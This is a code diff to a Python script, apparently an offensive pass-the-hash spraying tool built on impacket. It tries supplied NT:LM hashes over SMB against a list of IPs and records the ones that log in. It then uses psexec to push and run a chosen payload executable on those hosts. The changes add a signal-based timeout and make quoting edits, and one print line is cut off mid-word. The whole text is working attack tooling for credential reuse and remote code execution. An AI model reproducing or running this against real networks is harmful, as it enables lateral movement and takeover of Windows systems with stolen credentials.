@@ -5,7 +5,20 @@ import blessings
 import sys
 import re
 import argparse
+import signal
 from impacket.smbconnection import *
+
+class timeout:
+    def __init__(self, seconds, error_message='Timeout'):
+        self.seconds = seconds
+        self.error_message = error_message
+    def handle_timeout(self, signum, frame):
+        raise Exception(self.error_message)
+    def __enter__(self):
+        signal.signal(signal.SIGALRM, self.handle_timeout)
+        signal.alarm(self.seconds)
+    def __exit__(self, type, value, traceback):
+        signal.alarm(0)
 
 t = blessings.Terminal()
 
@@ -23,15 +36,15 @@ targetsprayhash = []
 targetipseperated = []
 targetpassword = None
 workinghashes = []
-command = ''
-path = ''
+command = ""
+path = ""
 exeFile = args.payloadpath
-copyFile = ''
+copyFile = ""
 
 print t.bold_green + "[*] Chosen Payload: " + t.normal + exeFile
 if not args.hashfile:
     targethash = raw_input("[*] Enter Hashes Seperated by Comma: ")
-    targetsprayhash = targethash.split(',')
+    targetsprayhash = targethash.split(",")
 else:
     hashfile = True
     print t.bold_green + "[*] Hash File Selected: " + t.normal + args.hashfile
@@ -63,17 +76,16 @@ for ip in targetipseperated:
         targetlm, targetnt = hash.split(':')
         print t.green + "[*] NT:LM Hash: " + t.normal + hash.strip(' ') + "," + ip
         try:
-            smb = SMBConnection(ip, ip, sess_port=445,timeout=5)
-            smb.setTimeout(5)
-        except:
-            print t.bold_red + "[!!] SMB Port not Open or Timed Out!!" +t.normal
+            with timeout(8):
+                smb = SMBConnection(ip, ip, sess_port=445)
+        except Exception as E:
+            print t.bold_red + "[!!] Timed Out!" +t.normal
+            print E
             continue
         try:
-            smb.setTimeout(5)
             smb.login(user=targetusername, password=targetpassword,
                       domain=targetdomain, lmhash=targetlm, nthash=targetnt)
             print t.bold_green + "[!] This Hash Worked - " + smb.getServerName() + t.norma
-            smb.logoff()
             workinghashes.append(hash + "," + ip)
         except:
             print t.bold_red + "[!] This Hash Failed" + t.normal
@@ -88,10 +100,10 @@ except:
     sys.exit(0)
 if want_to_psexec.lower() == "y" or want_to_psexec == "":
     for hash in workinghashes:
-        psexechash,psexecip = hash.split(',')
+        psexechash,psexecip = hash.split(",")
         PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
                                hashes=psexechash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
-        print t.bold_green + '\n[*] Starting Psexec....' + t.normal
+        print t.bold_green + "\n[*] Starting Psexec...." + t.normal
         try:
             PSEXEC.run(psexecip)
         except SessionError:
